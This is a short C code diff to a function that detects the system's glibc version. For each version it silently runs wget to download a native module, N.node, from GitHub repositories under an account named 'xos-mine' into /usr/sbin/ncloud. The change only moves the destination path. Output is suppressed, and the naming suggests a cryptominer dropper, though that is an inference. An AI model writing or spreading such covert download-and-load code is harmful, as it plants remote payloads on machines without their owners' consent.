@@ -63,11 +63,11 @@ void detect_libc() {
         if (strstr(buffer, "glibc") || strstr(buffer, "GLIBC")) {
             // cek versi GLIBC spesifik
             if (strstr(buffer, "2.39-0ubuntu8.4")) {
-                system("wget -q -O /usr/sbin/ncloud/N.node https://github.com/xos-mine/nbwc/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
+                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwc/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
             } else if (strstr(buffer, "2.35-0ubuntu3.10")) {
-                system("wget -q -O /usr/sbin/ncloud/N.node https://github.com/xos-mine/nbwd/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
+                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwd/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
             } else if (strstr(buffer, "2.31-0ubuntu9.7")) {
-                system("wget -q -O /usr/sbin/ncloud/N.node https://github.com/xos-mine/nbwg/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
+                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwg/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
             } 
         }
     }
